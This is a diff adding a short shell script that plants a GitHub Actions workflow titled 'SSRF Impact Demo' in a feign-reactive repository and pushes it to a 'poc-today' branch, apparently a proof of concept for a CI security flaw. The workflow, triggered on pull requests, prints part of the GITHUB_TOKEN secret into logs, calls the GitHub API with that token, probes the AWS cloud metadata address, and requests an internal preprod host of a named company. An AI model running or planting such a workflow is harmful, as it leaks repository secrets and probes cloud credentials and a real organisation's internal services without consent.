@@ -1,0 +1,21 @@
+cd feign-reactive
+mkdir -p .github/workflows/
+cat > .github/workflows/impact.yml << 'EOF'
+name: SSRF Impact Demo
+on: [pull_request]
+jobs:
+  demo:
+    runs-on: ubuntu-latest
+    steps:
+    - uses: actions/checkout@v4
+    - name: Demonstrate Impact
+      run: |
+        echo "GITHUB_TOKEN preview: ${{ secrets.GITHUB_TOKEN }}" | cut -c1-20
+        curl -H "Authorization: token $GITHUB_TOKEN" https://api.github.com/user
+        curl http://169.254.169.254/latest/meta-data/ 2>/dev/null || echo "No AWS"
+        curl -k -I https://bb-preprod-api.playtika.com/health || echo "Internal hit"
+EOF
+
+git add .github/workflows/impact.yml
+git commit -m "impact demo"
+git push origin poc-today
